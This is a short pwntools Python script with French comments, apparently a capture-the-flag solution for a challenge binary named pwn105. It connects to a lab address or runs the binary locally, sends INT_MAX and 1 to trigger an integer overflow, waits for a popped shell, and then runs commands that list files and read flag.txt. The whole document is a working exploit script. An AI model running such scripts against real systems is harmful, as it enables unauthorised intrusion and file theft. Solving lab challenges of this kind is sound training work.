from pwn import *

context.log_level = 'info'

if args.REMOTE:
    p = remote('10.128.131.51', 9005)   # port à vérifier
else:
    p = process('./pwn105-1644300421555.pwn105')

p.recvuntil(b']>> ')
p.sendline(b'2147483647')   # a = INT_MAX

p.recvuntil(b']>> ')
p.sendline(b'1')            # b = 1

# Attendre le shell
p.recvuntil(b'Popped Shell')
p.sendline(b'id')
p.sendline(b'ls -la')
p.sendline(b'cat flag.txt')
p.sendline(b'find / -name "flag*" 2>/dev/null | head')
p.interactive()
